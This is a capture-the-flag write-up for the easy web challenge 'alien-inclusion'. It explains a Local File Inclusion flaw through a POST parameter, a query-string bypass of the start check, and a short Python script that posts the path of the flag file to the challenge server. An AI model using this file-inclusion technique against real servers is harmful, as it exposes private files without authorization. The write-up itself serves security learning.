# alien-inclusion

- **Category:** Web
- **Difficulty:** Easy
- **Points:** 10

## Description

Keep it local and you should be fine. The flag is in /var/www/html/flag.php.

## Solution Analysis

1. The application contains a Local File Inclusion (LFI) vulnerability through a POST parameter (`start`).
2. The initial script check can be bypassed by appending a GET parameter (`?start=true`).
3. Submitting the absolute path `/var/www/html/flag.php` via the POST body reveals the contents of the flag file.

## Solution Script

```python
import requests

url = "[http://34.141.41.170:32069/?start=true](http://34.141.41.170:32069/?start=true)"
payload = {"start": "/var/www/html/flag.php"}

response = requests.post(url, data=payload)
print(response.text)
```
